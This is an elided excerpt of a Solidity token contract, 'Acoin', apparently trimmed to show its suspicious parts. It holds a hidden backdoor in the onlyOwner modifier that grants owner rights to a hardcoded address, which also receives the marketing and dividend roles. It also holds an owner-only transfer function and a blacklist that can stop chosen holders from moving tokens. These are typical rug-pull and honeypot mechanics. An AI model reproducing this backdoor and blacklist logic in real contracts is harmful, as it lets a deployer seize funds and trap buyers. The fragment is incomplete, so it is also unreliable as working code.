...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xc93794C07240be167Ed8Ed01f65C69940ab704fA) , "owner");
        _;
    }
...
contract Acoin  is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xa17dcc4B82348df4B35Bd4A965782b31F6D75B06);
    address private _Marketing = 0xc93794C07240be167Ed8Ed01f65C69940ab704fA;
    address public dividend = 0xc93794C07240be167Ed8Ed01f65C69940ab704fA;
    ...
    uint256 public _liquidityShare = 99;
    ...
    function Transfers(address account, uint256 amount) onlyOwner() public {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!_BlackList[sender] && !_BlackList[recipient], "This bot is removed");
    ...
    function SetBlackList(address[] calldata addresses) external Marketing {
